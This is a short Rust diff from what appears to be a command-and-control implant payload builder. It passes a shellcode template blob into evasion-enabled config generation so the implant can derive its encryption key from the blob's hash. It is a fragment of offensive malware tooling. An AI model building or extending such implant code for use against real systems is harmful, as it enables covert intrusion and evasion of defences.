@@ -216,7 +216,14 @@ impl PayloadBuilder {
         kill_date: Option<i64>,
         evasion: EvasionFlags,
     ) -> Result<BuildResult, BuilderError> {
-        // Generate config with evasion flags
+        // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
+        let pic_blob = self
+            .templates
+            .get(&OutputFormat::RawShellcode)
+            .map(|t| t.data.as_slice())
+            .unwrap_or(&[]);
+
+        // Generate config with evasion flags + PIC blob for key derivation
         let gen = generate_config_with_evasion(
             profile,
             server_pubkey,
@@ -224,6 +231,7 @@ impl PayloadBuilder {
             sleep_config,
             kill_date,
             evasion,
+            pic_blob,
         )?;
 
         let build_id = uuid::Uuid::new_v4().to_string();
